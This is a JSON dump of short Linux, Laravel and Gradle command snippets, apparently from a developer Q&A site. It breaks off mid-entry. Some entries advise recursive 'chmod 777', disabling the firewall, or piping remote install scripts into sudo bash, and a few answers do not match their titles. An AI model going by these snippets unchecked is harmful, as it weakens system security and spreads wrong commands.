    "keyword": null,
    "link": null,
    "title": " laravel create project command with version",
    "description": "composer create-project laravel/laravel=\"5.1.*\" appName\ncomposer create-project --prefer-dist laravel/laravel blog \"6.*\"\nBefore starting this hope you installed composer dependancy manager for PHP. -----------------------------------------------------------------------------  So if you want to create a project by name of 'first_laravel_app' in directory C:/xampp/htdocs/ then what you need to do is  Locate your project parent directory using cmd >cd c:/xampp/htdocs  and fire this command  >composer create-project laravel/laravel first_laravel_app --prefer-dist  And its done, this is really easy and it also creates Application Key automatically for you.    # I hope it will help you. # Namaste \n",
    "reg_date": "2021-10-11T22:09:20.000Z"
  },
  {
    "id": 3276,
    "keyword": null,
    "link": null,
    "title": " laravel install ui bootstrap with auth",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\n// How to install bootstrap in laravel with Auth  composer require laravel/ui php artisan ui bootstrap --auth npm install npm run dev\n",
    "reg_date": "2021-10-11T22:09:21.000Z"
  },
  {
    "id": 3277,
    "keyword": null,
    "link": null,
    "title": " laravel migrate rollback specific file",
    "description": "php artisan migrate:rollback --step=1\n",
    "reg_date": "2021-10-11T22:09:21.000Z"
  },
  {
    "id": 3278,
    "keyword": null,
    "link": null,
    "title": " laravel rollback last migration",
    "description": "php artisan migrate:rollback --step=1\nphp artisan migrate:rollback\nTo rollback one step:  php artisan migrate:rollback  To rollback multiple steps:  php artisan migrate:rollback --step=[x]    To drop all tables and reload all migrations:  php artisan migrate:fresh\nTry this command it works for me  php artisan migrate:fresh However, be careful! This command will drop all data from your DB:\nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\nphp artisan migrate:rollback --step=5\n",
    "reg_date": "2021-10-11T22:09:21.000Z"
  },
  {
    "id": 3279,
    "keyword": null,
    "link": null,
    "title": " last return code linux",
    "description": "echo $?\n",
    "reg_date": "2021-10-11T22:09:21.000Z"
  },
  {
    "id": 3280,
    "keyword": null,
    "link": null,
    "title": " latest gradle version",
    "description": "sudo apt update sudo apt install openjdk-8-jdk -y java -version  wget https://services.gradle.org/distributions/gradle-5.0-bin.zip -P /tmp sudo unzip -d /opt/gradle /tmp/gradle-*.zip ls /opt/gradle/gradle-5.0 sudo nano /etc/profile.d/gradle.sh  ####/etc/profile.d/gradle.sh export GRADLE_HOME=/opt/gradle/gradle-5.0 export PATH=${GRADLE_HOME}/bin:${PATH} ## save and exit  source /etc/profile.d/gradle.sh gradle -v\n$ gradle -v  ------------------------------------------------------------ Gradle 6.8.3 ------------------------------------------------------------\n#on android studio console type: gradlew --version\n",
    "reg_date": "2021-10-11T22:09:21.000Z"
  },
  {
    "id": 3281,
    "keyword": null,
    "link": null,
    "title": " latex pdf to eps",
    "description": "# from PDF to EPS pdftops -eps filename.pdf filename.eps  # from PDF to EPS (just some pages) pdftops -f num_first_page -l num_last_page -eps filename.pdf filename.eps  # from EPS to PDF ps2pdf filename.eps filename.pdf  # check if fonts are embedded pdffonts filename.pdf\n",
    "reg_date": "2021-10-11T22:09:21.000Z"
  },
  {
    "id": 3282,
    "keyword": null,
    "link": null,
    "title": " libespeak.so.1: cannot open shared object file: No such file or directory",
    "description": "pyttsx3 problem: It's because you don't have espeak installed on your system. That's why it is giving error  sudo apt-get update && sudo apt-get install espeak \nsudo apt-get install libglu1\nsudo apt-get update && sudo apt-get install espeak \nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda-9.0/lib64/\nsudo apt install libespeak1 \n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3283,
    "keyword": null,
    "link": null,
    "title": " libgthread-2.0.so.0: cannot open shared object file: No such file or directory",
    "description": "sudo apt-get update sudo apt-get install libglib2.0-0\nRUN apt-get update ##[edited] RUN apt-get install ffmpeg libsm6 libxext6  -y \n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3284,
    "keyword": null,
    "link": null,
    "title": " libpng12.so.0 ubuntu 18.04",
    "description": "wget -q -O /tmp/libpng12.deb http://mirrors.kernel.org/ubuntu/pool/main/libp/libpng/libpng12-0_1.2.54-1ubuntu1_amd64.deb dpkg -i /tmp/libpng12.deb rm /tmp/libpng12.deb\n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3285,
    "keyword": null,
    "link": null,
    "title": " libqt5x11extras5 install ubuntu",
    "description": "sudo apt install update sudo apt install -y libqt5x11extras5\n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3286,
    "keyword": null,
    "link": null,
    "title": " libreoffice ubuntu",
    "description": "# from ubuntu original sudo apt install libreoffice\n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3287,
    "keyword": null,
    "link": null,
    "title": " lines of code",
    "description": "find . -name '*.[FileExtention]' | xargs wc -l \n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3288,
    "keyword": null,
    "link": null,
    "title": " linkedin video downloader terminal",
    "description": "$ pip install llvd\n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3289,
    "keyword": null,
    "link": null,
    "title": " linux add to path",
    "description": "export PATH=$PATH:/place/with/the/file\n#Ubuntu 20.04:  echo 'export PATH=$PATH:$HOME/Android/Sdk/emulator' >> ~/.bashrc  #update current shell source ~/.bashrc \nexport PATH=\"$HOME/bin:$PATH\" \nexport PATH=\"/path/to/dir:$PATH\" \nexport PATH=/usr/java/<JDK Directory>/bin:$PATH.\nnano ~/.bashrc\n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3290,
    "keyword": null,
    "link": null,
    "title": " linux append group",
    "description": "usermod -a -G examplegroup exampleusername\n",
    "reg_date": "2021-10-11T22:09:22.000Z"
  },
  {
    "id": 3291,
    "keyword": null,
    "link": null,
    "title": " linux auto suspensd stop",
    "description": "sudo systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target\n",
    "reg_date": "2021-10-11T22:09:23.000Z"
  },
  {
    "id": 3292,
    "keyword": null,
    "link": null,
    "title": " linux bash export vars between shell instances",
    "description": "export_global_var () {  filename=/tmp/env test -f $filename || touch $filename    {     flock 0 #prevents isssues with multi thread process      #set -x  #enables verbose/debug      . /tmp/env     [ $# -eq 0 ] || export \"$@\"      echo \"$@\"     #echo \"$@\" >> /tmp/env  #export into file     KEY=`echo \"$@\" | awk '{split($0,a,\"=\"); print a[1]}'`    #sed '/\"$KEY\"/c > \"$@\"' $filename    VAR_IN_FILE=`cat $filename | grep \"$KEY\"`    (grep -q \"$KEY\" $filename || echo \"$@\" >> $filename) && grep -rl \"$KEY\" $filename | xargs sed -i \"s/$VAR_IN_FILE/$@/g\"    } < $filename    source $filename #import into mem }  import_global_var () {  filename=/tmp/env   echo \"importing global variables...\"  source $filename #import into mem }   USAGE: export_global_var DEPLOY_BOOLEAN=0  EXEC=1 #export var gobally import_global_var #import vars from global vars\n",
    "reg_date": "2021-10-11T22:09:23.000Z"
  },
  {
    "id": 3293,
    "keyword": null,
    "link": null,
    "title": " linux bookmark comands",
    "description": ". ~/.bashrc\n",
    "reg_date": "2021-10-11T22:09:23.000Z"
  },
  {
    "id": 3294,
    "keyword": null,
    "link": null,
    "title": " linux capitalize string using tr",
    "description": "# capitalize a raw string 'abc'  echo abc | tr a-z A-Z ABC # capitalize text from file 'hello_world.text'  tr a-z A-Z < hello_world.text HELLO WORLD\n",
    "reg_date": "2021-10-11T22:09:23.000Z"
  },
  {
    "id": 3295,
    "keyword": null,
    "link": null,
    "title": " linux change hostname",
    "description": "sudo nano /etc/hostname sudo nano /etc/hosts sudo reboot\n# login as root and make sure that there are no active processes for user usermod -l NEW_USERNAME OLD_USERNAME # if user is running kill user w the following command userUID=$(id -u OLD_USERNAME) && pkill -U $userUID\n# hostnamectl set-hostname your-new-hostname \n",
    "reg_date": "2021-10-11T22:09:23.000Z"
  },
  {
    "id": 3296,
    "keyword": null,
    "link": null,
    "title": " linux check cpu core",
    "description": "lscpu  #or cat /proc/cpuinfo \n",
    "reg_date": "2021-10-11T22:09:23.000Z"
  },
  {
    "id": 3297,
    "keyword": null,
    "link": null,
    "title": " linux check cronjob log",
    "description": " grep CRON /var/log/syslog\n",
    "reg_date": "2021-10-11T22:09:23.000Z"
  },
  {
    "id": 3298,
    "keyword": null,
    "link": null,
    "title": " linux check gpu usage",
    "description": "sudo lshw -C display \nnvidia-smi -l 1 \nnvidia-smi \n",
    "reg_date": "2021-10-11T22:09:24.000Z"
  },
  {
    "id": 3299,
    "keyword": null,
    "link": null,
    "title": " linux check if x11",
    "description": "echo $XDG_SESSION_TYPE\n",
    "reg_date": "2021-10-11T22:09:24.000Z"
  },
  {
    "id": 3300,
    "keyword": null,
    "link": null,
    "title": " linux check ip address command",
    "description": "#private ip hostname -I or ifconfig or ip addr show  #public ip curl ifconfig.me\nifconfig -a\ncurl ifconfig.me\n",
    "reg_date": "2021-10-11T22:09:24.000Z"
  },
  {
    "id": 3301,
    "keyword": null,
    "link": null,
    "title": " linux check ram frequency",
    "description": "sudo lshw -short -C memory\nfree -m\n",
    "reg_date": "2021-10-11T22:09:25.000Z"
  },
  {
    "id": 3302,
    "keyword": null,
    "link": null,
    "title": " linux check timezone",
    "description": "$ timedatectl | grep &ldquo;Time zone&rdquo; \n$ date +\"%Z %z\" \n/usr/share/zoneinfo/\ntimedatectl  Output ------------                       Local time: Tue 2019-12-03 16:30:44 UTC                   Universal time: Tue 2019-12-03 16:30:44 UTC                         RTC time: Tue 2019-12-03 16:30:44                        Time zone: Etc/UTC (UTC, +0000)        System clock synchronized: no systemd-timesyncd.service active: yes                  RTC in local TZ: no\n",
    "reg_date": "2021-10-11T22:09:25.000Z"
  },
  {
    "id": 3303,
    "keyword": null,
    "link": null,
    "title": " linux check used space in folder",
    "description": "du -h --max-depth=1\n",
    "reg_date": "2021-10-11T22:09:25.000Z"
  },
  {
    "id": 3304,
    "keyword": null,
    "link": null,
    "title": " linux check user group list",
    "description": "groups user\ngetent group groupname\ngrep 'group-name-here' /etc/group\ngroups groups userName-Here\n",
    "reg_date": "2021-10-11T22:09:25.000Z"
  },
  {
    "id": 3305,
    "keyword": null,
    "link": null,
    "title": " linux chown www-data",
    "description": "chown -R www-data:www-data /var/www\n",
    "reg_date": "2021-10-11T22:09:25.000Z"
  },
  {
    "id": 3306,
    "keyword": null,
    "link": null,
    "title": " linux command find file with extension",
    "description": "find . -type f -name \"*.txt\"\n",
    "reg_date": "2021-10-11T22:09:25.000Z"
  },
  {
    "id": 3307,
    "keyword": null,
    "link": null,
    "title": " linux command if directory exists",
    "description": "DIR=\"/etc/httpd/\" if [ -d \"$DIR\" ]; then   ### Take action if $DIR exists ###   echo \"Installing config files in ${DIR}...\" else   ###  Control will jump here if $DIR does NOT exists ###   echo \"Error: ${DIR} not found. Can not continue.\"   exit 1 fi\n",
    "reg_date": "2021-10-11T22:09:25.000Z"
  },
  {
    "id": 3308,
    "keyword": null,
    "link": null,
    "title": " linux command to check memory usage in percentage",
    "description": "free -m\n$ free -t | awk 'NR == 2 {printf(\"Current Memory Utilization is : %.2f%\"), $3/$2*100}' or $ free -t | awk 'FNR == 2 {printf(\"Current Memory Utilization is : %.2f%\"), $3/$2*100}'  Current Memory Utilization is : 20.42% \ntop - 15:20:30 up  6:57,  5 users,  load average: 0.64, 0.44, 0.33 Tasks: 265 total,   1 running, 263 sleeping,   0 stopped,   1 zombie %Cpu(s):  7.8 us,  2.4 sy,  0.0 ni, 88.9 id,  0.9 wa,  0.0 hi,  0.0 si,  0.0 st KiB Mem:   8167848 total,  6642360 used,  1525488 free,  1026876 buffers KiB Swap:  1998844 total,        0 used,  1998844 free,  2138148 cached    PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND                                                                                   2986 enlighte  20   0  584m  42m  26m S  14.3  0.5   0:44.27 yakuake                                                                                   1305 root      20   0  448m  68m  39m S   5.0  0.9   3:33.98 Xorg                                                                                      7701 enlighte  20   0  424m  17m  10m S   4.0  0.2   0:00.12 kio_thumbnail\n",
    "reg_date": "2021-10-11T22:09:25.000Z"
  },
  {
    "id": 3309,
    "keyword": null,
    "link": null,
    "title": " linux command to cut file and paste somewhere else",
    "description": "cp /ORIGIN/file.ext /DESTINATION/folder/\n",
    "reg_date": "2021-10-11T22:09:26.000Z"
  },
  {
    "id": 3310,
    "keyword": null,
    "link": null,
    "title": " linux command to list directory size",
    "description": "du -sh /home/george 2.1G    /home/george \nsudo du -sh /var\n",
    "reg_date": "2021-10-11T22:09:26.000Z"
  },
  {
    "id": 3311,
    "keyword": null,
    "link": null,
    "title": " linux command to restart machine",
    "description": "sudo reboot\n",
    "reg_date": "2021-10-11T22:09:26.000Z"
  },
  {
    "id": 3312,
    "keyword": null,
    "link": null,
    "title": " linux commands to get informaion about hardwarwe",
    "description": "//Note that these commands may only work on Debian based distros CPU To get processors related statistics you can use mpstat command but with some options it will provide better visibility: $ mpstat 2 10  Memory We all know command free to show amount of (remaining) RAM but to see all statistic including I/O operations: $ vmstat 2 10  Disk To get general information about your disk operations in real time you can utilise iostat. $ iostat -kx 2  Network To be able to see what is happening with your network services you can use netstat $ netstat -ntlp # open TCP sockets $ netstat -nulp # open UDP sockets $ netstat -nxlp # open Unix sockets  Some similar commands: df -h       : Check the status of the various drives on your computer. lscpu\t\t: It is an easy way to get CPU information. free        : Show the amount of (remaining) RAM.\n",
    "reg_date": "2021-10-11T22:09:26.000Z"
  },
  {
    "id": 3313,
    "keyword": null,
    "link": null,
    "title": " linux convert files in folder",
    "description": "for i in *.avi; do ffmpeg -i \"$i\" \"${i%.*}.mp4\"; done\n",
    "reg_date": "2021-10-11T22:09:26.000Z"
  },
  {
    "id": 3314,
    "keyword": null,
    "link": null,
    "title": " linux count files in directory",
    "description": "ls | wc -l\nls -1q  | wc -l\nls -1q log* | wc -l\n#count files in a directory faster with: ls -f | wc -l\nfind /path/to/directory | wc -l\n",
    "reg_date": "2021-10-11T22:09:26.000Z"
  },
  {
    "id": 3315,
    "keyword": null,
    "link": null,
    "title": " linux cpu infos",
    "description": "# >>\"lscpu\"<< shows general information about your CPU: #\t- name # \t- frequency # \t- architecture # \t- etc.  lscpu  # If you were looking for the current CPU usage, try >>\"top\"<<\n",
    "reg_date": "2021-10-11T22:09:26.000Z"
  },
  {
    "id": 3316,
    "keyword": null,
    "link": null,
    "title": " linux create folder with date",
    "description": "mkdir \"$(date +\"%d-%m-%Y\")\"\n",
    "reg_date": "2021-10-11T22:09:27.000Z"
  },
  {
    "id": 3317,
    "keyword": null,
    "link": null,
    "title": " linux create public key",
    "description": "ssh-keygen -t rsa -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:09:27.000Z"
  },
  {
    "id": 3318,
    "keyword": null,
    "link": null,
    "title": " linux create virtualenv",
    "description": "# Install virtualenv using pip3 sudo pip3 install virtualenv  # Create virtualenv virtualenv venv virtualenv -p python3 venv # To create virtualenv with python3 for example virtualenv -p /usr/bin/python2.7 # To create virtualenv with Python interpreter of your choice  # Activate virtualenv source venv/bin/activate  # Desactivate venv deactivate\npython3 -m venv env python -m virtualenv env #py2  source env/bin/activate  #all this is on same directory \n# If any of the other dont work try <env name>\\bin\\activate\n",
    "reg_date": "2021-10-11T22:09:27.000Z"
  },
  {
    "id": 3319,
    "keyword": null,
    "link": null,
    "title": " linux custom command",
    "description": "alias grabip=\"grep -oE '\\b([0-9]{1,3}\\.){3}([0-9]{1,3})\\b'\"\n",
    "reg_date": "2021-10-11T22:09:27.000Z"
  },
  {
    "id": 3320,
    "keyword": null,
    "link": null,
    "title": " linux decode base64 terminal",
    "description": "//Encode echo  'linuxhint.com' | base64  //Decode echo 'bGludXhoaW50LmNvbQo=' | base64 --decode\n",
    "reg_date": "2021-10-11T22:09:27.000Z"
  },
  {
    "id": 3321,
    "keyword": null,
    "link": null,
    "title": " linux delete appledouble ds store files",
    "description": "find . -name \".DS_Store\"        -exec rm -Rf {} \\; find . -name \".apdisk\"          -exec rm -Rf {} \\; find . -name \".AppleDouble\"     -exec rm -Rf {} \\; find . -name \".AppleDB\"         -exec rm -Rf {} \\; find . -name \"afpd.core\"        -exec rm -Rf {} \\; find . -name \".TemporaryItems\"  -exec rm -Rf {} \\; find . -name \"__MACOSX\"         -exec rm -Rf {} \\; find . -name \"._*\"              -exec rm -Rf {} \\; \n",
    "reg_date": "2021-10-11T22:09:27.000Z"
  },
  {
    "id": 3322,
    "keyword": null,
    "link": null,
    "title": " linux diff two folder recursively",
    "description": "diff -rq dir1 dir2\n",
    "reg_date": "2021-10-11T22:09:28.000Z"
  },
  {
    "id": 3323,
    "keyword": null,
    "link": null,
    "title": " linux dir one line",
    "description": "ls -1a\n",
    "reg_date": "2021-10-11T22:09:28.000Z"
  },
  {
    "id": 3324,
    "keyword": null,
    "link": null,
    "title": " linux disable firewall",
    "description": "# Check status, stop and disable ufw (Ubuntu) or Firewalld (CentOS) # ufw instructions lower # enable instructions included at the bottom  #check if Firewalld is running: sudo systemctl status firewalld  #Stop firewalld sudo systemctl stop firewalld  #disable firewalld sudo systemctl disable firewalld   #check if ufw is running  sudo ufw status   or  sudo systemctl status ufw  #stop the ufw on linux sudo ufw disable  #disable ufw sudo systemctl disable ufw  ------------------ #enable firewalld sudo systemctl enable firewalld  #start firewalld sudo systemctl start firewalld ------------------ #enable ufw sudo ufw enable  #start ufw systemctl start ufw   \n",
    "reg_date": "2021-10-11T22:09:28.000Z"
  },
  {
    "id": 3325,
    "keyword": null,
    "link": null,
    "title": " linux document root",
    "description": "sudo grep -ri DocumentRoot /etc\n",
    "reg_date": "2021-10-11T22:09:28.000Z"
  },
  {
    "id": 3326,
    "keyword": null,
    "link": null,
    "title": " linux download youtube mp3",
    "description": "youtube-dl --extract-audio --audio-format mp3 <video URL>\n",
    "reg_date": "2021-10-11T22:09:28.000Z"
  },
  {
    "id": 3327,
    "keyword": null,
    "link": null,
    "title": " linux drop caches",
    "description": "# clear pagecache only. sync; echo 1 > /proc/sys/vm/drop_caches  # clear dentries and inodes. sync; echo 2 > /proc/sys/vm/drop_caches  # clear pagecache, dentries and inodes. sync; echo 3 > /proc/sys/vm/drop_caches \n# sync; echo 3 > /proc/sys/vm/drop_caches  \nsync; echo 2 > /proc/sys/vm/drop_caches \n# sync; echo 3 > /proc/sys/vm/drop_caches\n",
    "reg_date": "2021-10-11T22:09:28.000Z"
  },
  {
    "id": 3328,
    "keyword": null,
    "link": null,
    "title": " linux enable scroll lock",
    "description": "xmodmap -e 'add mod3 = Scroll_Lock'\n",
    "reg_date": "2021-10-11T22:09:28.000Z"
  },
  {
    "id": 3329,
    "keyword": null,
    "link": null,
    "title": " linux execute permission denied",
    "description": "// permission denied ? give exeutue  permissions   chmod u+x program_name // now run program program_name\n",
    "reg_date": "2021-10-11T22:09:28.000Z"
  },
  {
    "id": 3330,
    "keyword": null,
    "link": null,
    "title": " linux exit file path",
    "description": "# Close a folder # If you're in one location because you used the cd command,  # you can \"close\" that location by going back to your home directory. $ cd $ pwd /home/username\n",
    "reg_date": "2021-10-11T22:09:29.000Z"
  },
  {
    "id": 3331,
    "keyword": null,
    "link": null,
    "title": " linux extract tgz",
    "description": "tar zxvf file_name.tgz  where, -z : Uncompress the resulting archive with gzip command -x : Extract to disk from the archive -v : Produce verbose output i.e. show progress and file names while extracting files -f backup.tgz : Read the archive from the specified file called backup.tgz\ntar zxvf file.tgz\n",
    "reg_date": "2021-10-11T22:09:29.000Z"
  },
  {
    "id": 3332,
    "keyword": null,
    "link": null,
    "title": " linux file size",
    "description": "cd dir ; du -hsx * | sort -rh | head -20  # example output # 300MB    some_backup_file.log # 1.8GB    some_huge_file.war\n#Get file size of each folder du -bsh *\n",
    "reg_date": "2021-10-11T22:09:29.000Z"
  },
  {
    "id": 3333,
    "keyword": null,
    "link": null,
    "title": " linux find after date",
    "description": "touch --date \"2007-01-01\" /tmp/start touch --date \"2008-01-01\" /tmp/end find /data/images -type f -newer /tmp/start -not -newer /tmp/end  find . -type f -newermt 2017-09-24 ! -newermt 2017-09-25\n",
    "reg_date": "2021-10-11T22:09:29.000Z"
  },
  {
    "id": 3334,
    "keyword": null,
    "link": null,
    "title": " linux find any file linux",
    "description": "#find a file and print with path find . -print | grep -i *.txt \n",
    "reg_date": "2021-10-11T22:09:29.000Z"
  },
  {
    "id": 3335,
    "keyword": null,
    "link": null,
    "title": " linux find directores",
    "description": "find -type d -iname $name\n",
    "reg_date": "2021-10-11T22:09:29.000Z"
  },
  {
    "id": 3336,
    "keyword": null,
    "link": null,
    "title": " linux find files by name",
    "description": "# -iname flag ignores case find / -iname mYtestFiLe.txt\n#find a file and print with path find . -print | grep -i *.txt \n",
    "reg_date": "2021-10-11T22:09:30.000Z"
  },
  {
    "id": 3337,
    "keyword": null,
    "link": null,
    "title": " linux find from file content",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n",
    "reg_date": "2021-10-11T22:09:30.000Z"
  },
  {
    "id": 3338,
    "keyword": null,
    "link": null,
    "title": " linux find largest files only",
    "description": "sudo find / -xdev -type f -size +100M\n",
    "reg_date": "2021-10-11T22:09:30.000Z"
  },
  {
    "id": 3339,
    "keyword": null,
    "link": null,
    "title": " linux find multiple filenames",
    "description": "find /home/my_repo | grep -E \"(filename1|name2|filename3)\"\n",
    "reg_date": "2021-10-11T22:09:30.000Z"
  },
  {
    "id": 3340,
    "keyword": null,
    "link": null,
    "title": " linux find size of directory and subdirectories",
    "description": "du -s /home/george  \n",
    "reg_date": "2021-10-11T22:09:30.000Z"
  },
  {
    "id": 3341,
    "keyword": null,
    "link": null,
    "title": " linux find text in files recursively -include",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n# look for airflow Variable usage recursively in it's homepath # include only python and sql files in the search grep --include=\\*.{py,sql} -rnw /home/airflow -e 'Variable'  # shows how to use exclude... it'll skip data or log files grep --exclude=\\*.{data,log} -rnw . -e 'Variable'\n$ grep -r \"String to be searched goes here\" *\ngrep --include=\\*.{c,h} -rnw '/path/to/somewhere/' -e \"pattern\"\n",
    "reg_date": "2021-10-11T22:09:30.000Z"
  },
  {
    "id": 3342,
    "keyword": null,
    "link": null,
    "title": " linux format usb command line",
    "description": "df -h  Select the correct drive sudo umount /dev/sdc1 This command formats the drive as FAT32, you can use other formats too sudo mkfs.vfat /dev/sdc1\numount fdisk -l to get the dev/sxxx For the vFAT (FAT32) file system: sudo mkfs.vfat /dev/sdc1\n",
    "reg_date": "2021-10-11T22:09:30.000Z"
  },
  {
    "id": 3343,
    "keyword": null,
    "link": null,
    "title": " linux full permission to folder",
    "description": "# Change permissions for the root file/dir only chmod 777 path/to/directory/ # Or chmod 777 path/to/file # Change permission for root dir and all files/dirs within chmod -R 777 path/to/directory/\nlinux folder\n",
    "reg_date": "2021-10-11T22:09:31.000Z"
  },
  {
    "id": 3344,
    "keyword": null,
    "link": null,
    "title": " linux generate csr",
    "description": "openssl req -new -newkey rsa:2048 -nodes -keyout domain.key -out domain.csr\n",
    "reg_date": "2021-10-11T22:09:31.000Z"
  },
  {
    "id": 3345,
    "keyword": null,
    "link": null,
    "title": " linux get available commands",
    "description": "compgen -c will list all the commands you could run. compgen -a will list all the aliases you could run. compgen -b will list all the built-ins you could run. compgen -k will list all the keywords you could run. compgen -A function will list all the functions you could run.\n",
    "reg_date": "2021-10-11T22:09:31.000Z"
  },
  {
    "id": 3346,
    "keyword": null,
    "link": null,
    "title": " linux get current user",
    "description": "whoami\necho \"$USER\"\n",
    "reg_date": "2021-10-11T22:09:31.000Z"
  },
  {
    "id": 3347,
    "keyword": null,
    "link": null,
    "title": " linux get distro",
    "description": "cat /etc/os-release\n",
    "reg_date": "2021-10-11T22:09:31.000Z"
  },
  {
    "id": 3348,
    "keyword": null,
    "link": null,
    "title": " linux get docker compose logs",
    "description": "docker-compose logs -t -f --tail <no of lines>  \n",
    "reg_date": "2021-10-11T22:09:31.000Z"
  },
  {
    "id": 3349,
    "keyword": null,
    "link": null,
    "title": " linux get free disk space Code Example",
    "description": "du -h --max-depth=1\n",
    "reg_date": "2021-10-11T22:09:31.000Z"
  },
  {
    "id": 3350,
    "keyword": null,
    "link": null,
    "title": " linux get recursive directory size",
    "description": "du -sh /path/to/directory \n",
    "reg_date": "2021-10-11T22:09:32.000Z"
  },
  {
    "id": 3351,
    "keyword": null,
    "link": null,
    "title": " linux get uuid of partition",
    "description": "sudo blkid -o value -s UUID </dev/sdXN>\n",
    "reg_date": "2021-10-11T22:09:32.000Z"
  },
  {
    "id": 3352,
    "keyword": null,
    "link": null,
    "title": " linux give full permission to directory",
    "description": "# Change permissions for the root file/dir only chmod 777 path/to/directory/ # Or chmod 777 path/to/file # Change permission for root dir and all files/dirs within chmod -R 777 path/to/directory/\n",
    "reg_date": "2021-10-11T22:09:32.000Z"
  },
  {
    "id": 3353,
    "keyword": null,
    "link": null,
    "title": " linux give permission to directory",
    "description": "sudo chmod -R a+rwx /path/to/folder\n",
    "reg_date": "2021-10-11T22:09:32.000Z"
  },
  {
    "id": 3354,
    "keyword": null,
    "link": null,
    "title": " linux give permission to folder",
    "description": "sudo chmod -R a+rwx /path/to/folder\n# Change permissions for the root file/dir only chmod 777 path/to/directory/ # Or chmod 777 path/to/file # Change permission for root dir and all files/dirs within chmod -R 777 path/to/directory/\nsudo chmod u+w myfolder \nchmod 777 foldername  #will give read, write, and execute permissions for everyone.\nsudo find /folder/path/public_html -type f -exec chmod 644 {} \\; sudo find /folder/path/public_html -type d -exec chmod 755 {} \\;  sudo find . -type f -exec chmod 664 {} \\;    sudo find . -type d -exec chmod 775 {} \\;  sudo chown -R $USER:www-data .  ### Assign permission to web users for writting folder sudo chgrp -R www-data storage/framework storage/logs bootstrap/cache  sudo chmod -R ug+rwx storage/framework storage/logs bootstrap/cache \n",
    "reg_date": "2021-10-11T22:09:32.000Z"
  },
  {
    "id": 3355,
    "keyword": null,
    "link": null,
    "title": " linux history with time",
    "description": " HISTTIMEFORMAT=\"%d/%m/%y %T \"  history\n",
    "reg_date": "2021-10-11T22:09:32.000Z"
  },
  {
    "id": 3356,
    "keyword": null,
    "link": null,
    "title": " linux how to get fqdn",
    "description": "hostname --fqdn\n",
    "reg_date": "2021-10-11T22:09:32.000Z"
  },
  {
    "id": 3357,
    "keyword": null,
    "link": null,
    "title": " linux how to see directory data usage",
    "description": "du -sh /var\ndu -sh /home/george 2.1G    /home/george \ndu -hs * | sort -rh\n",
    "reg_date": "2021-10-11T22:09:33.000Z"
  },
  {
    "id": 3358,
    "keyword": null,
    "link": null,
    "title": " linux how to see ports in use",
    "description": "# Any of the following sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo lsof -i:22 # see a specific port such as 22 sudo nmap -sTU -O IP-address-Here\nsudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo lsof -i:22 # see a specific port such as 22 sudo nmap -sTU -O IP-address-Here\nsudo netstat -tulpn | grep LISTEN  sudo lsof -i:22 # see a specific port such as 22\n# it list the all running ports with process id. $ netstat -ltnp\n",
    "reg_date": "2021-10-11T22:09:33.000Z"
  },
  {
    "id": 3359,
    "keyword": null,
    "link": null,
    "title": " linux how to show disk space",
    "description": "du -h --max-depth=1\ndf -a\ndf -hi\ndf -hia or df -h\n",
    "reg_date": "2021-10-11T22:09:33.000Z"
  },
  {
    "id": 3360,
    "keyword": null,
    "link": null,
    "title": " linux install figlet",
    "description": "sudo apt install figlet\n",
    "reg_date": "2021-10-11T22:09:33.000Z"
  },
  {
    "id": 3361,
    "keyword": null,
    "link": null,
    "title": " linux install idle",
    "description": "sudo apt-get install idle3\n$ sudo apt install idle                [On Debian/Ubuntu for Python2] $ sudo apt-get install idle3           [On Debian/Ubuntu for Python3] $ sudo yum install python3-tools       [On CentOS/RHEL and Fedora]\n",
    "reg_date": "2021-10-11T22:09:33.000Z"
  },
  {
    "id": 3362,
    "keyword": null,
    "link": null,
    "title": " linux install ifconfig",
    "description": "apt-get update apt-get install net-tools\napt-get install net-tools \n",
    "reg_date": "2021-10-11T22:09:33.000Z"
  },
  {
    "id": 3363,
    "keyword": null,
    "link": null,
    "title": " linux install make",
    "description": "sudo apt-get install build-essential \n",
    "reg_date": "2021-10-11T22:09:33.000Z"
  },
  {
    "id": 3364,
    "keyword": null,
    "link": null,
    "title": " linux install node",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\nsudo apt install nodejs\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt-get install nodejs npm install -g npm@latest\n# It's a good idea to use NVM (Node Version Manager) if you want to install # Node.js on Linux because it allows you to install many versions of Node # simultaneously and switch between them easily  # Navigate to desktop to avoid problems with permissions cd ~/Desktop  # Download the nvm script, but please note that new versions of nvm are # released as the time pass, so you should always check the following link: # https://github.com/nvm-sh/nvm#installing-and-updating # to get updated info sudo apt install curl && curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash  # You need to check whether nvm has been added to the PATH or not # So you should execute the command nvm --version  # IF IT HASN'T BEEN ADDED TO THE PATH, THEN MAKE SURE TO EXECUTE THESE COMMANDS: export NVM_DIR=\"$([ -z \"${XDG_CONFIG_HOME-}\" ] && printf %s \"${HOME}/.nvm\" || printf %s \"${XDG_CONFIG_HOME}/nvm\")\" [ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"  # To install the latest version of node, use the command: 